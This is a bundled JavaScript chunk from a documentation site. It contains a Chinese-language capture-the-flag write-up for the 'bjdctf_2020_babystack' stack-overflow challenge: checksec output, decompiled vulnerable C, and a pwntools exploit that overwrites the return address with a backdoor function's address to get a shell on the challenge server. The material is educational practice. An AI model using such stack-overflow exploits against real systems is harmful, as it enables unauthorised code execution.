(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[832],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return u},kt:function(){return f}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function c(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var s=r.createContext({}),l=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):c(c({},n),e)),t},u=function(e){var n=l(e.components);return r.createElement(s.Provider,{value:n},e.children)},p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},b=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),b=l(t),f=a,d=b["".concat(s,".").concat(f)]||b[f]||p[f]||o;return t?r.createElement(d,c(c({ref:n},u),{},{components:t})):r.createElement(d,c({ref:n},u))}));function f(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,c=new Array(o);c[0]=b;var i={};for(var s in n)hasOwnProperty.call(n,s)&&(i[s]=n[s]);i.originalType=e,i.mdxType="string"==typeof e?e:a,c[1]=i;for(var l=2;l<o;l++)c[l]=t[l];return r.createElement.apply(null,c)}return r.createElement.apply(null,t)}b.displayName="MDXCreateElement"},716:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return i},contentTitle:function(){return s},metadata:function(){return l},toc:function(){return u},default:function(){return b}});var r=t(2122),a=t(9756),o=(t(7294),t(3905)),c=["components"],i={title:"bjdctf_2020_babystack",sidebar_position:12},s=void 0,l={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack",id:"BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack",isDocsHomePage:!1,title:"bjdctf_2020_babystack",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\bjdctf_2020_babystack.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack",version:"current",sidebarPosition:12,frontMatter:{title:"bjdctf_2020_babystack",sidebar_position:12},sidebar:"tutorialSidebar",previous:{title:"ciscn_2019_en_2",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_en_2"},next:{title:"not_the_same_3dsctf_2016",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016"}},u=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],p={toc:u};function b(e){var n=e.components,t=(0,a.Z)(e,c);return(0,o.kt)("wrapper",(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"\u6808\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740")),(0,o.kt)("h2",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,o.kt)("p",null,"checksec\u770b\u4e00\u4e0b"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=bjdctf_2020_babystack \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74) Symbols       No    0               1               bjdctf_2020_babystack\n")),(0,o.kt)("p",null,"\u53ef\u4ee5\u6ea2\u51fa\uff0c\u5148\u62d6\u8fdbida64\u770b\u770b\u6709\u6ca1\u6709\u6ea2\u51fa\u70b9\u3002"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[12]; // [rsp+0h] [rbp-10h] BYREF\n  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF\n\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stdin, 0LL, 1, 0LL);\n  LODWORD(nbytes) = 0;\n  puts("**********************************");\n  puts("*     Welcome to the BJDCTF!     *");\n  puts("* And Welcome to the bin world!  *");\n  puts("*  Let\'s try to pwn the world!   *");\n  puts("* Please told me u answer loudly!*");\n  puts("[+]Are u ready?");\n  puts("[+]Please input the length of your name:");\n  //highlight-next-line\n  __isoc99_scanf("%d", &nbytes);\n  puts("[+]What\'s u name?");\n  //highlight-next-line\n  read(0, buf, (unsigned int)nbytes);\n  return 0;\n}\n')),(0,o.kt)("p",null,"nbytes\u662f\u6211\u4eec\u8bfb\u53d6\u7684\u540d\u5b57\u957f\u5ea6\uff0c\u8fd9\u4e2a\u503c\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u56e0\u6b64\u5f88\u5bb9\u6613\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6808\u6ea2\u51fa\u53bb\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002"),(0,o.kt)("p",null,"\u5728\u5de6\u8fb9\u51fd\u6570\u5217\u8868\u4e2d\u53d1\u73b0\u4e86\u540e\u95e8\u51fd\u6570",(0,o.kt)("inlineCode",{parentName:"p"},"backdoor"),"\uff0c\u8be5\u51fd\u6570\u7684\u5730\u5740\u4e3a",(0,o.kt)("inlineCode",{parentName:"p"},"0x4006E6"),"\u3002"),(0,o.kt)("p",null,"\u6700\u7ec8\u811a\u672c\u5982\u4e0b\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 0\nfile_name = './bjdctf_2020_babystack'\nhost = 'node4.buuoj.cn'\nport = 26840\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    payload = b'a' * 0x18 + p64(0x4006E6)\n    \n    sh.sendlineafter('name:', '34')\n    sh.sendlineafter('name?', payload)\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}b.isMDXComponent=!0}}]);